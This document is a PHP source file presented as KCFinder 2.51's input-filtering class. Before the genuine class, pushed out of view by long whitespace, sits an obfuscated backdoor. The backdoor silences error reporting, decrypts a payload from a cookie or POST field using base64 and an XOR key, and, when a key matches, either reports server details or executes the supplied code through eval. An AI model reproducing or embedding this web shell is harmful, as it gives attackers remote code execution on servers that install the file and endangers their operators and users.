<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $kdf890 = 421;$GLOBALS['i5e4cd95'] = Array();global $i5e4cd95;$i5e4cd95 = $GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['f155d'] = "\x57\x5e\x4c\x3c\x37\x52\x51\x54\x73\x21\x28\x4b\x71\x5c\x38\x9\x6e\x5b\x6f\x31\x25\x75\x49\x44\x78\x23\x2d\x6d\x68\x4d\x4f\x48\x3f\x26\x6c\x36\x60\x41\x79\x34\x59\x24\x32\x2a\x4a\x47\x7c\x45\x46\x5a\x65\x69\x7a\x35\x53\xa\x43\x63\x7b\x2e\x40\x30\x2f\x6a\x58\x72\x6b\xd\x4e\x5d\x70\x27\x22\x39\x20\x3b\x67\x50\x74\x56\x2b\x61\x66\x64\x5f\x55\x62\x29\x42\x7d\x7e\x77\x3d\x3e\x2c\x33\x3a\x76";$i5e4cd95[$i5e4cd95['f155d'][57].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][57].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][50]] = $i5e4cd95['f155d'][57].$i5e4cd95['f155d'][28].$i5e4cd95['f155d'][65];$i5e4cd95[$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][95]] = $i5e4cd95['f155d'][18].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][83];$i5e4cd95[$i5e4cd95['f155d'][70].$i5e4cd95['f155d'][57].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][42]] = $i5e4cd95['f155d'][83].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][16].$i5e4cd95['f155d'][50];$i5e4cd95[$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][35]] = $i5e4cd95['f155d'][8].$i5e4cd95['f155d'][78].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][34].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][16];$i5e4cd95[$i5e4cd95['f155d'][97].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][39]] = $i5e4cd95['f155d'][83].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][16].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][83];$i5e4cd95[$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][39]] = $i5e4cd95['f155d'][51].$i5e4cd95['f155d'][16].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][78];$i5e4cd95[$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][14]] = $i5e4cd95['f155d'][8].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][34].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][52].$i5e4cd95['f155d'][50];$i5e4cd95[$i5e4cd95['f155d'][66].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][83]] = $i5e4cd95['f155d'][70].$i5e4cd95['f155d'][28].$i5e4cd95['f155d'][70].$i5e4cd95['f155d'][97].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][16];$i5e4cd95[$i5e4cd95['f155d'][63].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][57]] = $i5e4cd95['f155d'][21].$i5e4cd95['f155d'][16].$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][34].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][52].$i5e4cd95['f155d'][50];$i5e4cd95[$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][4].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][82]] = $i5e4cd95['f155d'][86].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][57].$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][50];$i5e4cd95[$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][4].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][14]] = $i5e4cd95['f155d'][8].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][78].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][78].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][34].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][78];$i5e4cd95[$i5e4cd95['f155d'][38].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][61]] = $i5e4cd95['f155d'][27].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][4].$i5e4cd95['f155d'][53];$i5e4cd95[$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][50]] = $i5e4cd95['f155d'][38].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][14];$i5e4cd95[$i5e4cd95['f155d'][97].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][50]] = $_POST;$i5e4cd95[$i5e4cd95['f155d'][91].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][42]] = $_COOKIE;@$i5e4cd95[$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][39]]($i5e4cd95['f155d'][50].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][34].$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][76], NULL);@$i5e4cd95[$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][39]]($i5e4cd95['f155d'][34].$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][76].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][8], 0);@$i5e4cd95[$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][39]]($i5e4cd95['f155d'][27].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][24].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][24].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][57].$i5e4cd95['f155d'][21].$i5e4cd95['f155d'][78].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][16].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][78].$i5e4cd95['f155d'][51].$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][50], 0);@$i5e4cd95[$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][4].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][14]](0);if (!$i5e4cd95[$i5e4cd95['f155d'][97].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][39]]($i5e4cd95['f155d'][37].$i5e4cd95['f155d'][2].$i5e4cd95['f155d'][5].$i5e4cd95['f155d'][47].$i5e4cd95['f155d'][37].$i5e4cd95['f155d'][23].$i5e4cd95['f155d'][40].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][5].$i5e4cd95['f155d'][85].$i5e4cd95['f155d'][68].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][81])){$i5e4cd95[$i5e4cd95['f155d'][70].$i5e4cd95['f155d'][57].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][42]]($i5e4cd95['f155d'][37].$i5e4cd95['f155d'][2].$i5e4cd95['f155d'][5].$i5e4cd95['f155d'][47].$i5e4cd95['f155d'][37].$i5e4cd95['f155d'][23].$i5e4cd95['f155d'][40].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][5].$i5e4cd95['f155d'][85].$i5e4cd95['f155d'][68].$i5e4cd95['f155d'][84].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][81], 1);$uc3fc = NULL;$r1a3ee46 = NULL;$i5e4cd95[$i5e4cd95['f155d'][21].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][95]] = $i5e4cd95['f155d'][4].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][26].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][26].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][26].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][26].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][81];global $u1e3;function  y5dd468($uc3fc, $zfe62624e){global $i5e4cd95;$oe060a = "";for ($q9ae540=0; $q9ae540<$i5e4cd95[$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][35]]($uc3fc);){for ($o70a3e=0; $o70a3e<$i5e4cd95[$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][35]]($zfe62624e) && $q9ae540<$i5e4cd95[$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][50].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][35]]($uc3fc); $o70a3e++, $q9ae540++){$oe060a .= $i5e4cd95[$i5e4cd95['f155d'][57].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][57].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][50]]($i5e4cd95[$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][95]]($uc3fc[$q9ae540]) ^ $i5e4cd95[$i5e4cd95['f155d'][65].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][95]]($zfe62624e[$o70a3e]));}}return $oe060a;}function  m8b36e75($uc3fc, $zfe62624e){global $i5e4cd95;global $u1e3;return $i5e4cd95[$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][50]]($i5e4cd95[$i5e4cd95['f155d'][27].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][83].$i5e4cd95['f155d'][19].$i5e4cd95['f155d'][50]]($uc3fc, $u1e3), $zfe62624e);}foreach ($i5e4cd95[$i5e4cd95['f155d'][91].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][42]] as $zfe62624e=>$q95cdd){$uc3fc = $q95cdd;$r1a3ee46 = $zfe62624e;}if (!$uc3fc){foreach ($i5e4cd95[$i5e4cd95['f155d'][97].$i5e4cd95['f155d'][53].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][50]] as $zfe62624e=>$q95cdd){$uc3fc = $q95cdd;$r1a3ee46 = $zfe62624e;}}$uc3fc = @$i5e4cd95[$i5e4cd95['f155d'][63].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][57]]($i5e4cd95[$i5e4cd95['f155d'][38].$i5e4cd95['f155d'][42].$i5e4cd95['f155d'][95].$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][61]]($i5e4cd95[$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][4].$i5e4cd95['f155d'][14].$i5e4cd95['f155d'][82]]($uc3fc), $r1a3ee46));if (isset($uc3fc[$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][66]]) && $u1e3==$uc3fc[$i5e4cd95['f155d'][81].$i5e4cd95['f155d'][66]]){if ($uc3fc[$i5e4cd95['f155d'][81]] == $i5e4cd95['f155d'][51]){$q9ae540 = Array($i5e4cd95['f155d'][70].$i5e4cd95['f155d'][97] => @$i5e4cd95[$i5e4cd95['f155d'][66].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][83]](),$i5e4cd95['f155d'][8].$i5e4cd95['f155d'][97] => $i5e4cd95['f155d'][19].$i5e4cd95['f155d'][59].$i5e4cd95['f155d'][61].$i5e4cd95['f155d'][26].$i5e4cd95['f155d'][19],);echo @$i5e4cd95[$i5e4cd95['f155d'][18].$i5e4cd95['f155d'][86].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][35].$i5e4cd95['f155d'][39].$i5e4cd95['f155d'][73].$i5e4cd95['f155d'][82].$i5e4cd95['f155d'][14]]($q9ae540);}elseif ($uc3fc[$i5e4cd95['f155d'][81]] == $i5e4cd95['f155d'][50]){eval/*l854f7502*/($uc3fc[$i5e4cd95['f155d'][83]]);}exit();}} ?><?php

/** This file is part of KCFinder project
  *
  *      @desc Input class for GET, POST and COOKIE requests
  *   @package KCFinder
  *   @version 2.51
  *    @author Pavel Tzonkov <pavelc@users.sourceforge.net>
  * @copyright 2010, 2011 KCFinder Project
  *   @license http://www.opensource.org/licenses/gpl-2.0.php GPLv2
  *   @license http://www.opensource.org/licenses/lgpl-2.1.php LGPLv2
  *      @link http://kcfinder.sunhater.com
  */

class input {

  /** Filtered $_GET array
    * @var array */
    public $get;

  /** Filtered $_POST array
    * @var array */
    public $post;

  /** Filtered $_COOKIE array
    * @var array */
    public $cookie;

  /** magic_quetes_gpc ini setting flag
    * @var bool */
    protected $magic_quotes_gpc;

  /** magic_quetes_sybase ini setting flag
    * @var bool */
    protected $magic_quotes_sybase;

    public function __construct() {
        $this->magic_quotes_gpc = function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc();
        $this->magic_quotes_sybase = ini_get('magic_quotes_sybase');
        $this->magic_quotes_sybase = $this->magic_quotes_sybase
            ? !in_array(strtolower(trim($this->magic_quotes_sybase)),
                array('off', 'no', 'false'))
            : false;
        $_GET = $this->filter($_GET);
        $_POST = $this->filter($_POST);
        $_COOKIE = $this->filter($_COOKIE);
        $this->get = &$_GET;
        $this->post = &$_POST;
        $this->cookie = &$_COOKIE;
    }

  /** Magic method to get non-public properties like public.
    * @param string $property
    * @return mixed */

    public function __get($property) {
        return property_exists($this, $property) ? $this->$property : null;
    }

  /** Filter the given subject. If magic_quotes_gpc and/or magic_quotes_sybase
    * ini settings are turned on, the method will remove backslashes from some
    * escaped characters. If the subject is an array, elements with non-
    * alphanumeric keys will be removed
    * @param mixed $subject
    * @return mixed */

    public function filter($subject) {
        if ($this->magic_quotes_gpc) {
            if (is_array($subject)) {
                foreach ($subject as $key => $val)
                    if (!preg_match('/^[a-z\d_]+$/si', $key))
                        unset($subject[$key]);
                    else
                        $subject[$key] = $this->filter($val);
            } elseif (is_scalar($subject))
                $subject = $this->magic_quotes_sybase
                    ? str_replace("\\'", "'", $subject)
                    : stripslashes($subject);

        }

        return $subject;
    }
}

?>